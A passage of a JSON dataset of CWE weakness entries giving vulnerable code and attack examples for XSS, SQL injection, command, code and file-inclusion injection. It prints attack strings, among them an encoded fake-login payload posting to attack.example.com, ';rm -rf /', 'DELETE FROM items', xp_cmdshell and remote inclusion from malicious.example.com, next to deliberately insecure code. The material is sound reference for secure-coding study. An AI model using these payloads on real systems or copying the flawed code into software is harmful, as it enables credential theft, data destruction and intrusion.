\\\\u0022\\\\u003E\\\\u0050\\\\u006C\\\\u0065\\\\u0061\\\\u0073\\\\u0065\\\\u0020\\\\u004C\\\\u006F\\\\u0067 \\\\u0069\\\\u006E\\\\u003A\\\\u003C\\\\u0066\\\\u006F\\\\u0072\\\\u006D\\\\u0020\\\\u006E\\\\u0061\\\\u006D \\\\u0065\\\\u003D\\\\u0022\\\\u0069\\\\u006E\\\\u0070\\\\u0075\\\\u0074\\\\u0022\\\\u0020\\\\u0061\\\\u0063 \\\\u0074\\\\u0069\\\\u006F\\\\u006E\\\\u003D\\\\u0022\\\\u0068\\\\u0074\\\\u0074\\\\u0070\\\\u003A\\\\u002F \\\\u002F\\\\u0061\\\\u0074\\\\u0074\\\\u0061\\\\u0063\\\\u006B\\\\u002E\\\\u0065\\\\u0078\\\\u0061\\\\u006D \\\\u0070\\\\u006C\\\\u0065\\\\u002E\\\\u0063\\\\u006F\\\\u006D\\\\u002F\\\\u0073\\\\u0074\\\\u0065\\\\u0061 \\\\u006C\\\\u0050\\\\u0061\\\\u0073\\\\u0073\\\\u0077\\\\u006F\\\\u0072\\\\u0064\\\\u002E\\\\u0070\\\\u0068 \\\\u0070\\\\u0022\\\\u0020\\\\u006D\\\\u0065\\\\u0074\\\\u0068\\\\u006F\\\\u0064\\\\u003D\\\\u0022\\\\u0070 \\\\u006F\\\\u0073\\\\u0074\\\\u0022\\\\u003E\\\\u0055\\\\u0073\\\\u0065\\\\u0072\\\\u006E\\\\u0061\\\\u006D \\\\u0065\\\\u003A\\\\u0020\\\\u003C\\\\u0069\\\\u006E\\\\u0070\\\\u0075\\\\u0074\\\\u0020\\\\u0074\\\\u0079 \\\\u0070\\\\u0065\\\\u003D\\\\u0022\\\\u0074\\\\u0065\\\\u0078\\\\u0074\\\\u0022\\\\u0020\\\\u006E\\\\u0061 \\\\u006D\\\\u0065\\\\u003D\\\\u0022\\\\u0075\\\\u0073\\\\u0065\\\\u0072\\\\u006E\\\\u0061\\\\u006D\\\\u0065 \\\\u0022\\\\u0020\\\\u002F\\\\u003E\\\\u003C\\\\u0062\\\\u0072\\\\u002F\\\\u003E\\\\u0050\\\\u0061\\\\u0073 \\\\u0073\\\\u0077\\\\u006F\\\\u0072\\\\u0064\\\\u003A\\\\u0020\\\\u003C\\\\u0069\\\\u006E\\\\u0070\\\\u0075 \\\\u0074\\\\u0020\\\\u0074\\\\u0079\\\\u0070\\\\u0065\\\\u003D\\\\u0022\\\\u0070\\\\u0061\\\\u0073\\\\u0073 \\\\u0077\\\\u006F\\\\u0072\\\\u0064\\\\u0022\\\\u0020\\\\u006E\\\\u0061\\\\u006D\\\\u0065\\\\u003D\\\\u0022 \\\\u0070\\\\u0061\\\\u0073\\\\u0073\\\\u0077\\\\u006F\\\\u0072\\\\u0064\\\\u0022\\\\u0020\\\\u002F\\\\u003E \\\\u003C\\\\u0069\\\\u006E\\\\u0070\\\\u0075\\\\u0074\\\\u0020\\\\u0074\\\\u0079\\\\u0070\\\\u0065\\\\u003D \\\\u0022\\\\u0073\\\\u0075\\\\u0062\\\\u006D\\\\u0069\\\\u0074\\\\u0022\\\\u0020\\\\u0076\\\\u0061\\\\u006C \\\\u0075\\\\u0065\\\\u003D\\\\u0022\\\\u004C\\\\u006F\\\\u0067\\\\u0069\\\\u006E\\\\u0022\\\\u0020\\\\u002F \"\\\\u003E\\\\u003C\\\\u002F\\\\u0066\\\\u006F\\\\u0072\\\\u006D\\\\u003E\\\\u003C\\\\u002F\\\\u0064\\\\u0069\\\\u0076\\\\u003E\\\\u000D');</script>\" Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs. Example 2 This example also displays a Reflected XSS (Type 1) scenario. The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user. (bad code) Example Language: JSP <% String eid = request.getParameter(\"eid\"); %> ... Employee ID: <%= eid %> The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user. (bad code) Example Language: ASP.NET <% protected System.Web.UI.WebControls.TextBox Login; protected System.Web.UI.WebControls.Label EmployeeID; ... EmployeeID.Text = Login.Text; %> <p><asp:label id=\"EmployeeID\" runat=\"server\" /></p> The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Example 3 This example covers a Stored XSS (Type 2) scenario. \"The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\" (bad code) Example Language: JSP <%Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(\"select * from emp where id=\"+eid); if (rs != null) { rs.next(); String name = rs.getString(\"name\"); }%> Employee Name: <%= name %> The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID. (bad code) Example Language: ASP.NET <% protected System.Web.UI.WebControls.Label EmployeeName; ... string query = \"select * from emp where id=\" + eid; sda = new SqlDataAdapter(query, conn); sda.Fill(dt); string name = dt.Rows[0][\"Name\"]; ... EmployeeName.Text = name;%> <p><asp:label id=\"EmployeeName\" runat=\"server\" /></p> \"This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser.\" Example 4 The following example consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario. CreateUser.php (bad code) Example Language: PHP $username = mysql_real_escape_string($username); $fullName = mysql_real_escape_string($fullName); $query = sprintf(\\'Insert Into users (username,password) Values (\"%s\",\"%s\",\"%s\")\\', $username, crypt($password),$fullName) ; mysql_query($query); /.../ The code is careful to avoid a SQL injection attack ( CWE-89 ) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information: ListUsers.php (bad code) Example Language: PHP \"$query = 'Select * From users Where loggedIn=true';\" $results = mysql_query($query); if (!$results) { exit; } //Print list of users to page echo \\'<div id=\"userlist\">Currently Active Users:\\'; while ($row = mysql_fetch_assoc($results)) { echo \\'<div class=\"userNames\">\\'.$row[\\'fullname\\'].\\'</div>\\'; } \"echo '</div>';\" The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message. Example 5 Consider an application that provides a simplistic message board that saves messages in HTML format and appends them to a file.  When a new user arrives in the room, it makes an announcement: (bad code) Example Language: PHP $name = $_COOKIE[\"myname\"]; $announceStr = \"$name just logged in.\"; //save HTML-formatted message to file; implementation details are irrelevant for this example. saveMessage($announceStr); An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like: (attack code) \"<script>document.alert('Hacked');</script>\" The raw contents of the message file would look like: (result) \"<script>document.alert('Hacked');</script> has logged in.\" For each person who visits the message page, their browser would execute the script, generating a pop-up window that says \"Hacked\". More malicious attacks are possible; see the rest of this entry."
    },
    {
        "id": 80,
        "demonstrative_examples": "Example 1 \"In the following example, a guestbook comment isn't properly encoded, filtered, or otherwise neutralized for script-related tags before being displayed in a client browser.\" (bad code) Example Language: JSP <% for (Iterator i = guestbook.iterator(); i.hasNext(); ) { Entry e = (Entry) i.next(); %> <p>Entry #<%= e.getId() %></p> <p><%= e.getText() %></p> <% } %>"
    },
    {
        "id": 81,
        "demonstrative_examples": ""
    },
    {
        "id": 82,
        "demonstrative_examples": ""
    },
    {
        "id": 83,
        "demonstrative_examples": ""
    },
    {
        "id": 84,
        "demonstrative_examples": ""
    },
    {
        "id": 85,
        "demonstrative_examples": ""
    },
    {
        "id": 86,
        "demonstrative_examples": ""
    },
    {
        "id": 87,
        "demonstrative_examples": "Example 1 In the following example, an XSS neutralization method intends to replace script tags in user-supplied input with a safe equivalent: (bad code) Example Language: Java public String preventXSS(String input, String mask) { return input.replaceAll(\"script\", mask); } The code only works when the \"script\" tag is in all lower-case, forming an incomplete denylist ( CWE-184 ). Equivalent tags such as \"SCRIPT\" or \"ScRiPt\" will not be neutralized by this method, allowing an XSS attack."
    },
    {
        "id": 88,
        "demonstrative_examples": "Example 1 The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system. (bad code) Example Language: C int main(int argc, char** argv) { char cmd[CMD_MAX] = \"/usr/bin/cat \"; strcat(cmd, argv[1]); system(cmd); } Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form \";rm -rf /\", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition. Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow ( CWE-120 )."
    },
    {
        "id": 89,
        "demonstrative_examples": "Example 1 In 2008, a large number of web servers were compromised using the same SQL injection attack string. This single string worked against many different programs. The SQL injection was then used to modify the web sites to serve malicious code. Example 2 The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where owner matches the user name of the currently-authenticated user. (bad code) Example Language: C# ... string userName = ctx.getAuthenticatedUserName(); string query = \"SELECT * FROM items WHERE owner = \\'\" + userName + \"\\' AND itemname = \\'\" + ItemName.Text + \"\\'\"; sda = new SqlDataAdapter(query, conn); DataTable dt = new DataTable(); sda.Fill(dt); ... The query that this code intends to execute follows: (informative) SELECT * FROM items WHERE owner = <userName> AND itemname = <itemName>; However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string: (attack code) \"name' OR 'a'='a\" for itemName, then the query becomes the following: (attack code) \"SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';\" The addition of the: (attack code) \"OR 'a'='a\" condition causes the WHERE clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query: (attack code) SELECT * FROM items; This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the items table, regardless of their specified owner. Example 3 This example examines the effects of a different malicious value passed to the query constructed and executed in the previous example. If an attacker with the user name wiley enters the string: (attack code) \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries: (attack code) Example Language: SQL \"SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';\" DELETE FROM items; \"--'\" Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database. Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in the previous example. If an attacker enters the string (attack code) \"name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a\" Then the following three valid statements will be created: (attack code) \"SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name';\" DELETE FROM items; \"SELECT * FROM items WHERE 'a'='a';\" One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allowlist of safe values or identify and escape a denylist of potentially malicious values. Allowlists can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, denylisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can: Target fields that are not quoted Find ways to bypass the need for certain escaped meta-characters Use stored procedures to hide the injected meta-characters. Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks. Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they do not protect against many others. For example, the following PL/SQL procedure is vulnerable to the same SQL injection attack shown in the first example. (bad code) procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm in varchar2) is open itm_cv for \"' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND itemname = ' || itm || ';\" end get_item; Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks. Example 4 MS SQL has a built in function that enables shell command execution. An SQL injection in such a context could be disastrous. For example, a query of the form: (bad code) \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input' ORDER BY PRICE\" Where $user_input is taken from an untrusted source. If the user provides the string: (attack code) \"'; exec master..xp_cmdshell 'dir' --\" The query will take the following form: (attack code) \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec master..xp_cmdshell 'dir' --' ORDER BY PRICE\" Now, this query can be broken down into: \"a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='';\" \"a second SQL query, which executes the dir command in the shell: exec master..xp_cmdshell 'dir'\" \"an MS SQL comment: --' ORDER BY PRICE\" As can be seen, the malicious input changes the semantics of the query into a query, a shell command execution and a comment. Example 5 This code intends to print a message summary given the message ID. (bad code) Example Language: PHP $id = $_COOKIE[\"mid\"]; mysql_query(\"SELECT MessageID, Subject FROM messages WHERE MessageID = \\'$id\\'\"); The programmer may have skipped any input validation on $id under the assumption that attackers cannot modify the cookie. However, this is easy to do with custom client code or even in the web browser. While $id is wrapped in single quotes in the call to mysql_query(), an attacker could simply change the incoming mid cookie to: (attack code) \"1432' or '1' = '1\" This would produce the resulting query: (result) \"SELECT MessageID, Subject FROM messages WHERE MessageID = '1432' or '1' = '1'\" Not only will this retrieve message number 1432, it will retrieve all other messages. In this case, the programmer could apply a simple modification to the code to eliminate the SQL injection: (good code) Example Language: PHP $id = intval($_COOKIE[\"mid\"]); mysql_query(\"SELECT MessageID, Subject FROM messages WHERE MessageID = \\'$id\\'\"); However, if this code is intended to support multiple users with different message boxes, the code might also need an access control check ( CWE-285 ) to ensure that the application user has the permission to see that message. Example 6 This example attempts to take a last name provided by a user and enter it into a database. (bad code) Example Language: Perl $userKey = getUserID(); $name = getUserInput(); # ensure only letters, hyphens and apostrophe are allowed $name = allowList($name, \"^a-zA-z\\'-$\"); $query = \"INSERT INTO last_names VALUES(\\'$userKey\\', \\'$name\\')\"; While the programmer applies a allowlist to the user input, it has shortcomings. First of all, the user is still allowed to provide hyphens, which are used as comment structures in SQL. If a user specifies \"--\" then the remainder of the statement will be treated as a comment, which may bypass security logic. Furthermore, the allowlist permits the apostrophe, which is also a data / command separator in SQL. If a user supplies a name with an apostrophe, they may be able to alter the structure of the whole statement and even change control flow of the program, possibly accessing or modifying confidential information. In this situation, both the hyphen and apostrophe are legitimate characters for a last name and permitting them is required. Instead, a programmer may want to use a prepared statement or apply an encoding routine to the input to prevent any data / directive misinterpretations."
    },
    {
        "id": 90,
        "demonstrative_examples": "Example 1 The code below constructs an LDAP query using user input address data: (bad code) Example Language: Java context = new InitialDirContext(env); String searchFilter = \"StreetAddress=\" + address; NamingEnumeration answer = context.search(searchBase, searchFilter, searchCtls); Because the code fails to neutralize the address string used to construct the query, an attacker can supply an address that includes additional LDAP queries."
    },
    {
        "id": 91,
        "demonstrative_examples": ""
    },
    {
        "id": 93,
        "demonstrative_examples": "Example 1 \"If user input data that eventually makes it to a log message isn't checked for CRLF characters, it may be possible for an attacker to forge entries in a log file.\" (bad code) Example Language: Java logger.info(\"User\\'s street address: \" + request.getParameter(\"streetAddress\"));"
    },
    {
        "id": 94,
        "demonstrative_examples": "Example 1 This example attempts to write user messages to a message file and allow users to view them. (bad code) Example Language: PHP $MessageFile = \"messages.out\"; if ($_GET[\"action\"] == \"NewMessage\") { $name = $_GET[\"name\"]; $message = $_GET[\"message\"]; $handle = fopen($MessageFile, \"a+\"); fwrite($handle, \"<b>$name</b> says \\'$message\\'<hr>\\\\n\"); fclose($handle); echo \"Message Saved!<p>\\\\n\"; } else if ($_GET[\"action\"] == \"ViewMessages\") { include($MessageFile); } While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as: (attack code) name=h4x0r message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E which will decode to the following: (attack code) <?php system(\"/bin/ls -l\");?> The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages. Notice that XSS ( CWE-79 ) is also possible in this situation. Example 2 edit-config.pl: This CGI script is used to modify settings in a configuration file. (bad code) Example Language: Perl use CGI qw(:standard); sub config_file_add_key { my ($fname, $key, $arg) = @_; # code to add a field/key to a file goes here } sub config_file_set_key { my ($fname, $key, $arg) = @_; # code to set key to a particular file goes here } sub config_file_delete_key { my ($fname, $key, $arg) = @_; # code to delete key from a particular file goes here } sub handleConfigAction { my ($fname, $action) = @_; \"my $key = param('key');\" \"my $val = param('val');\" # this is super-efficient code, especially if you have to invoke # any one of dozens of different functions! my $code = \"config_file_$action_key(\\\\$fname, \\\\$key, \\\\$val);\"; eval($code); } $configfile = \"/home/cwe/config.txt\"; print header; \"if (defined(param('action'))) {\" \"handleConfigAction($configfile, param('action'));\" } else { print \"No action specified!\\\\n\"; } \"The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:\" (attack code) add_key(\",\",\"); system(\"/bin/ls\"); This would produce the following string in handleConfigAction(): (result) config_file_add_key(\",\",\"); system(\"/bin/ls\"); Any arbitrary Perl code could be added after the attacker has \"closed off\" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker\\'s payload is activated. This particular manipulation would fail after the system() call, because the \"_key(\\\\$fname, \\\\$key, \\\\$val)\" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated."
    },
    {
        "id": 95,
        "demonstrative_examples": "Example 1 edit-config.pl: This CGI script is used to modify settings in a configuration file. (bad code) Example Language: Perl use CGI qw(:standard); sub config_file_add_key { my ($fname, $key, $arg) = @_; # code to add a field/key to a file goes here } sub config_file_set_key { my ($fname, $key, $arg) = @_; # code to set key to a particular file goes here } sub config_file_delete_key { my ($fname, $key, $arg) = @_; # code to delete key from a particular file goes here } sub handleConfigAction { my ($fname, $action) = @_; \"my $key = param('key');\" \"my $val = param('val');\" # this is super-efficient code, especially if you have to invoke # any one of dozens of different functions! my $code = \"config_file_$action_key(\\\\$fname, \\\\$key, \\\\$val);\"; eval($code); } $configfile = \"/home/cwe/config.txt\"; print header; \"if (defined(param('action'))) {\" \"handleConfigAction($configfile, param('action'));\" } else { print \"No action specified!\\\\n\"; } \"The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:\" (attack code) add_key(\",\",\"); system(\"/bin/ls\"); This would produce the following string in handleConfigAction(): (result) config_file_add_key(\",\",\"); system(\"/bin/ls\"); Any arbitrary Perl code could be added after the attacker has \"closed off\" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker\\'s payload is activated. This particular manipulation would fail after the system() call, because the \"_key(\\\\$fname, \\\\$key, \\\\$val)\" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated."
    },
    {
        "id": 96,
        "demonstrative_examples": "Example 1 This example attempts to write user messages to a message file and allow users to view them. (bad code) Example Language: PHP $MessageFile = \"messages.out\"; if ($_GET[\"action\"] == \"NewMessage\") { $name = $_GET[\"name\"]; $message = $_GET[\"message\"]; $handle = fopen($MessageFile, \"a+\"); fwrite($handle, \"<b>$name</b> says \\'$message\\'<hr>\\\\n\"); fclose($handle); echo \"Message Saved!<p>\\\\n\"; } else if ($_GET[\"action\"] == \"ViewMessages\") { include($MessageFile); } While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as: (attack code) name=h4x0r message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E which will decode to the following: (attack code) <?php system(\"/bin/ls -l\");?> The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages. Notice that XSS ( CWE-79 ) is also possible in this situation."
    },
    {
        "id": 97,
        "demonstrative_examples": ""
    },
    {
        "id": 98,
        "demonstrative_examples": "Example 1 \"The following code, victim.php, attempts to include a function contained in a separate PHP page on the server. It builds the path to the file by using the supplied 'module_name' parameter and appending the string '/function.php' to it.\" (bad code) Example Language: PHP \"$dir = $_GET['module_name'];\" include($dir . \"/function.php\"); The problem with the above code is that the value of $dir is not restricted in any way, and a malicious user could manipulate the \\'module_name\\' parameter to force inclusion of an unanticipated file. For example, an attacker could request the above PHP page (example.php) with a \\'module_name\\' of \"http://malicious.example.com\" by using the following request string: (attack code) victim.php?module_name=http://malicious.example.com Upon receiving this request, the code would set \\'module_name\\' to the value \"http://malicious.example.com\" and would attempt to include http://malicious.example.com/function.php, along with any malicious code it contains. For the sake of this example, assume that the malicious version of function.php looks like the following: (bad code) \"system($_GET['cmd']);\" An attacker could now go a step further in our example and provide a request string as follows: (attack code) victim.php?module_name=http://malicious.example.com&cmd=/bin/ls%20-l \"The code will attempt to include the malicious function.php file from the remote site. In turn, this file executes the command specified in the 'cmd' parameter from the query string. The end result is an attempt by tvictim.php to execute the potentially malicious command, in this case:\" (attack code) /bin/ls -l Note that the above PHP example can be mitigated by setting allow_url_fopen to false, although this will not fully protect the code. See potential mitigations."
    },
    {
        "id": 99,
        "demonstrative_examples": "Example 1 The following Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files. (bad code) Example Language: Java String rName = request.getParameter(\"reportName\"); File rFile = new File(\"/usr/local/apfr/reports/\" + rName); ... rFile.delete(); Example 2 The following code uses input from the command line to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can create soft links to the file, they can use the program to read the first part of any file on the system. (bad code) Example Language: C++ ifstream ifs(argv[0]); string s; ifs >> s; cout << s; The kind of resource the data affects indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash, are risky when used in methods that interact with the file system. (Resource injection, when it is related to file system resources, sometimes goes by the name \"path manipulation.\") Similarly, data that contains URLs and URIs is risky for functions that create remote connections."
    },
    {
        "id": 102,
        "demonstrative_examples": "Example 1 Two validation forms with the same name. (bad code) Example Language: XML <form-validation> <formset> <form name=\"ProjectForm\"> ... </form> <form name=\"ProjectForm\"> ... </form> </formset> </form-validation> It is critically important that validation logic be maintained and kept in sync with the rest of the application."
    },
    {
        "id": 103,
        "demonstrative_examples": "Example 1 In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and the RegistrationForm bean in the Struts framework will maintain the user data. Tthe RegistrationForm class implements the validate method to validate the user input entered into the form. (bad code) Example Language: Java public class RegistrationForm extends org.apache.struts.validator.ValidatorForm { // private variables for registration form private String name; private String email; ... public RegistrationForm() { super(); } public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) { ActionErrors errors = new ActionErrors(); if (getName() == null || getName().length() < 1) { errors.add(\"name\", new ActionMessage(\"error.name.required\")); } return errors; } // getter and setter methods for private variables ... } Although the validate method is implemented in this example the method does not call the validate method of the ValidatorForm parent class with a call super.validate(). Without the call to the parent validator class only the custom validation will be performed and the default validation will not be performed. The following example shows that the validate method of the ValidatorForm class is called within the implementation of the validate method. (good code) Example Language: Java public class RegistrationForm extends org.apache.struts.validator.ValidatorForm { // private variables for registration form private String name; private String email; ... public RegistrationForm() { super(); } public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) { ActionErrors errors = super.validate(mapping, request); if (errors == null) { errors = new ActionErrors(); } if (getName() == null || getName().length() < 1) { errors.add(\"name\", new ActionMessage(\"error.name.required\")); } return errors; } // getter and setter methods for private variables ... }"
    },
    {
        "id": 104,
        "demonstrative_examples": "Example 1 In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user information from a registration webpage for an online business site. The user will enter registration data and through the Struts framework the RegistrationForm bean will maintain the user data. (bad code) Example Language: Java public class RegistrationForm extends org.apache.struts.action.ActionForm { // private variables for registration form private String name; private String email; ... public RegistrationForm() { super(); } // getter and setter methods for private variables ... } However, the RegistrationForm class extends the Struts ActionForm class which does not allow the RegistrationForm class to use the Struts validator capabilities. When using the Struts framework to maintain user data in an ActionForm Bean, the class should always extend one of the validator classes, ValidatorForm, ValidatorActionForm, DynaValidatorForm or DynaValidatorActionForm. These validator classes provide default validation and the validate method for custom validation for the Bean object to use for validating input data. The following Java example shows the RegistrationForm class extending the ValidatorForm class and implementing the validate method for validating input data. (good code) Example Language: Java public class RegistrationForm extends org.apache.struts.validator.ValidatorForm { // private variables for registration form private String name; private String email; ... public RegistrationForm() { super(); } public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...} // getter and setter methods for private variables ... } Note that the ValidatorForm class itself extends the ActionForm class within the Struts framework API."
    },
    {
        "id": 105,
        "demonstrative_examples": "Example 1 In the following example the Java class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and, through the Struts framework, the RegistrationForm bean will maintain the user data in the form fields using the private member variables. The RegistrationForm class uses the Struts validation capability by extending the ValidatorForm class and including the validation for the form fields within the validator XML file, validator.xml. (result) public class RegistrationForm extends org.apache.struts.validator.ValidatorForm { // private variables for registration form private String name; private String address; private String city; private String state; private String zipcode; private String phone; private String email; public RegistrationForm() { super(); } // getter and setter methods for private variables ... } The validator XML file, validator.xml, provides the validation for the form fields of the RegistrationForm. (bad code) Example Language: XML <form-validation> <formset> <form name=\"RegistrationForm\"> <field property=\"name\" depends=\"required\"> <arg position=\"0\" key=\"prompt.name\"/> </field> <field property=\"address\" depends=\"required\"> <arg position=\"0\" key=\"prompt.address\"/> </field> <field property=\"city\" depends=\"required\"> <arg position=\"0\" key=\"prompt.city\"/> </field> <field property=\"state\" depends=\"required,mask\"> <arg position=\"0\" key=\"prompt.state\"/> <var> <var-name>mask</var-name> <var-value>[a-zA-Z]{2}</var-value> </var> </field> <field property=\"zipcode\" depends=\"required,mask\"> <arg position=\"0\" key=\"prompt.zipcode\"/> <var> <var-name>mask</var-name> <var-value>\\\\d{5}</var-value> </var> </field> </form> </formset> </form-validation> However, in the previous example the validator XML file, validator.xml, does not provide validators for all of the form fields in the RegistrationForm. Validator forms are only provided for the first five of the seven form fields. The validator XML file should contain validator forms for all of the form fields for a Struts ActionForm bean. The following validator.xml file for the RegistrationForm class contains validator forms for all of the form fields. (good code) Example Language: XML <form-validation> <formset> <form name=\"RegistrationForm\"> <field property=\"name\" depends=\"required\"> <arg position=\"0\" key=\"prompt.name\"/> </field> <field property=\"address\" depends=\"required\"> <arg position=\"0\" key=\"prompt.address\"/> </field> <field property=\"city\" depends=\"required\"> <arg position=\"0\" key=\"prompt.city\"/> </field> <field property=\"state\" depends=\"required,mask\"> <arg position=\"0\" key=\"prompt.state\"/> <var> <var-name>mask</var-name> <var-value>[a-zA-Z]{2}</var-value> </var> </field> <field property=\"zipcode\" depends=\"required,mask\"> <arg position=\"0\" key=\"prompt.zipcode\"/> <var> <var-name>mask</var-name> <var-value>\\\\d{5}</var-value> </var> </field> <field property=\"phone\" depends=\"required,mask\"> <arg position=\"0\" key=\"prompt.phone\"/> <var> <var-name>mask</var-name> <var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value> </var> </field> <field property=\"email\" depends=\"required,email\"> <arg position=\"0\" key=\"prompt.email\"/> </field> </form> </formset> </form-validation>"
    },
    {
        "id": 106,
        "demonstrative_examples": "Example 1 In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and, through the Struts framework, the RegistrationForm bean will maintain the user data. (bad code) Example Language: Java public class RegistrationForm extends org.apache.struts.action.ActionForm { // private variables for registration form private String name; private String email; ... public RegistrationForm() { super(); } // getter and setter methods for private variables ... } However, the RegistrationForm class extends the Struts ActionForm class which does use the Struts validator plug-in to provide validator capabilities. In the following example, the RegistrationForm Java class extends the ValidatorForm and Struts configuration XML file, struts-config.xml, instructs the application to use the Struts validator plug-in. (good code) Example Language: Java public class RegistrationForm extends org.apache.struts.validator.ValidatorForm { // private variables for registration form private String name; private String email; ... public RegistrationForm() { super(); } public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...} // getter and setter methods for private variables ... } The plug-in tag of the Struts configuration XML file includes the name of the validator plug-in to be used and includes a set-property tag to instruct the application to use the file, validator-rules.xml, for default validation rules and the file, validation.XML, for custom validation. (good code) Example Language: XML <struts-config> <form-beans> <form-bean name=\"RegistrationForm\" type=\"RegistrationForm\"/> </form-beans> ... <!-- ========================= Validator plugin ================================= --> <plug-in className=\"org.apache.struts.validator.ValidatorPlugIn\"> <set-property property=\"pathnames\" value=\"/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml\"/> </plug-in> </struts-config>"
    },
    {
        "id": 107,
